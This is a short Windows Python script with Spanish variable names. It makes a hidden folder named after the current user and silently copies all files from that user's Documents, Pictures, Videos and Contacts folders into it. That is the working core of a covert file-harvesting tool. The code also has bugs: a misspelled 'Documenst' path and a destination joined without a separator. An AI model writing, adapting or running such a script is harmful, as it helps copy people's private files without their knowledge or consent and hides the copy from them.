#!/usr/bin/env python
# coding: utf-8

import os,win32api,win32con
import shutil

direccion=os.getcwd()
usuario=os.getlogin()
try:
    os.mkdir(direccion+usuario)
    win32api.SetFileAttributes(direccion+usuario,win32con.FILE_ATTRIBUTE_HIDDEN)
except:
    pass
  
new_direccion=direccion+usuario # Destino
fuente='C:/Users/'
lista=['/Documenst','/Pictures','/Videos','/Contacts']
for objetivo in lista:
    for dispaht,dirname,filesname in os.walk(fuente+usuario+objetivo):
        for nombres in filesname:
            ruta=os.path.join(dispaht,nombres)
            shutil.copy(ruta,new_direccion)
    

